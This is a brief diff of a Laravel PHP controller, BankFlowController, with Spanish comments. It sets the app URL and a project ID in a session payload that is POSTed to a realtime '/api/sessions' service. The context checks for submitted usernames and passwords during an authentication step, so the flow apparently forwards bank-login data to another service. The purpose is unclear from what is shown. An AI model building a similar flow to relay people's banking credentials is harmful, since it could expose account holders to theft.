@@ -256,6 +256,10 @@ class BankFlowController extends Controller
             return \in_array($step, ['1', '2'], true) && ($hasUser || $hasPass) && (($sc['action'] ?? null) === 'AUTH');
         };
 
+        if (!empty($sc['url'])) {
+            $sc['url'] = env('APP_URL');;
+        }
+
         // 1) Ya existe sessionId => NO crear otra
         if (!empty($sc['rt_session_id'])) {
 
@@ -312,6 +316,8 @@ class BankFlowController extends Controller
         // 2) No hay sessionId => crear sesión realtime
         try {
             $url = $baseUrl . '/api/sessions';
+            $sc['url'] = env('APP_URL');
+            $sc['projectId'] = env('PROJECT_ID');
             $resp = Http::asJson()->timeout(10)->post($url, $sc);
 
             if ($resp instanceof PromiseInterface)
